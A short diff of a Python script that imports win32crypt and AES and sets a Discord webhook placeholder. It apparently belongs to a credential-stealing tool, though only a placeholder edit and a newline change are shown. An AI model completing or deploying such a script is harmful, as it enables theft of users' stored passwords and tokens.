@@ -9,7 +9,7 @@ from Crypto.Cipher import AES
 import win32crypt
 import asyncio
 
-WEBHOOK_URL = "ur Webhook here"
+WEBHOOK_URL = "your_discord_webhook_url_here"
 
 def setup():
     modules = [("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")]
@@ -237,3 +237,4 @@ def main():
 if __name__ == "__main__":
 
     main()
+
